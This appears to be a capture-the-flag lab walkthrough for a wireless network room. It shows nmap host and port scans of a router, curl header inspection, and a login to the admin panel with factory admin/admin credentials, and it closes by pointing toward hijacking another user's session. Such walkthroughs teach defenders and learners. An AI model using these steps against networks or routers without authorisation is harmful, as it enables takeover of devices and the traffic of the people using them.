An address on the subnet places the attacker among the other hosts on it, and the first thing worth establishing is which addresses are occupied. nmap is the scanner for that. -sn confines it to host discovery, probing each address in the given range and reporting which ones reply without touching any ports, so a 256-address sweep finishes in seconds and returns an inventory rather than a service list.  

```console
user@debian-thm:~$ sudo nmap -sn 192.168.2.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2026-07-04 15:22 CEST
Nmap scan report for 192.168.2.1
Host is up (0.00027s latency).
MAC Address: F0:9F:C2:71:22:12 (Ubiquiti Networks)
Nmap scan report for 192.168.2.7
Host is up (0.00030s latency).
MAC Address: 28:6C:07:6F:F9:43 (Xiaomi Electronics,co.)
Nmap scan report for 192.168.2.8
Host is up (0.00032s latency).
MAC Address: 28:6C:07:6F:F9:44 (Xiaomi Electronics,co.)
Nmap scan report for 192.168.2.23
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.03 seconds
```

The four hosts that respond are the gateway at 192.168.2.1, the two stations from the capture at 192.168.2.7 and 192.168.2.8, whose MAC Address lines match the pair airodump-ng listed and which become relevant later, and the attacking interface at 192.168.2.23, which reports no MAC Address line because it is the host running the scan. Whether those clients can be reached directly depends on client isolation, which, when enabled, stops the access point forwarding frames between two associated stations. The gateway is never isolated, because every client must reach it in order to route.  

The gateway is therefore the host to examine, and the second scan asks what it is running rather than whether it is there. -Pn instructs nmap to treat the target as up and scan it regardless of whether it answers the discovery probes, which stops a host that silently drops them from being written off as down before a single port is tried.  

```console
user@debian-thm:~$ sudo nmap -Pn 192.168.2.1
Starting Nmap 7.93 ( https://nmap.org ) at 2026-07-04 15:22 CEST
Nmap scan report for 192.168.2.1
Host is up (0.00012s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: F0:9F:C2:71:22:12 (Ubiquiti Networks)

Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
```

HTTP listening on the gateway almost always indicates a management interface.  

**The Admin Panel and Default Credentials**  

curl requests the page from the command line, and the response headers alone are enough to show what the server intends. -D - dumps those headers, the lone - standing for standard output rather than a filename, and -o /dev/null discards the body so nothing but the headers reaches the screen. -s suppresses the progress meter.  

```console
user@debian-thm:~$ curl -s -D - http://192.168.2.1/ -o /dev/null
HTTP/1.1 302 Found
Date: Sat, 04 Jul 2026 15:22:04 GMT
Server: Apache/2.4.66 (Debian)
Set-Cookie: PHPSESSID=REDACTED; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: login.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

The redirect to login.php indicates an application gating its content behind a session. The page is titled WiFi Router Configuration.  

Vendor defaults are the first credentials worth trying against a device of this kind. A consumer router ships with a factory administrator account whose username and password are printed in the manual and published on the vendor's support site, and its panel is normally reachable only from the internal network, so the account is frequently left as it shipped on the reasoning that anyone already inside is trusted. Associating to the Wi-Fi has just made that reasoning false.  

Submitting the factory admin/admin pair takes the same two requests used against the hidden network's panel in the reconnaissance room, a POST carrying the form fields and saving the cookie, then a second request presenting it:  

```console
user@debian-thm:~$ curl -s -c cookies.txt -d "Username=admin&Password=admin&Submit=Submit" http://192.168.2.1/login.php -o /dev/null
user@debian-thm:~$ curl -s -b cookies.txt http://192.168.2.1/index.php
    <title>WiFi Router Configuration</title>
...
Welcome admin<br><br>No FLAG, try logging in with another user ;)  <a href="logout.php">Click here</a> to Logout.
```

The defaults are accepted and the panel greets the session as admin. On a live router that account is the device, since the panel it unlocks sets the name servers handed to every client, the firewall and port-forwarding rules and the wireless configuration itself, which on most models displays the passphrase in cleartext. An unchanged factory password therefore converts access to the Wi-Fi into control of the network, which is why the pair is always tried first.  

What it does not yield here is the flag, which is scoped to one of the router's real users rather than to the administrator. Their passwords are long random strings that no wordlist recovers, so the route to them is not a password at all but a session one of them has already opened.  


